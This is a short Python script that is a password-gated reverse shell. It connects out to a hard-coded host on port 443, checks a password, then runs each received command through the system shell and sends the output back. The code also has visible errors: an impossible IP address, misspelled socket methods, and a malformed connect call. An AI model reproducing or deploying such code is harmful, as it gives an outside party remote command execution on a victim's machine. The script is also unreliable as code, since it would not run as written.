# /user/bin/python
import subprocess
import socket

host = "198.256.1.1"
port = "443"
passwd = "ewrf456sd7s"

#Check Password
def Login():
    global s
    s.send("Login: ")
    pwd = s.reccv(1824)

    if pwd.strip() != passwd:
        Login()
    else:
        s.send("Connected #> ")
        Shell()

#Execute Shell commands
def Shell():
    while True:
        data = s.recv(1824)

        if data.strip() == ":kill":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.semd(output)
        s.send("#> ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host.port))
Login()
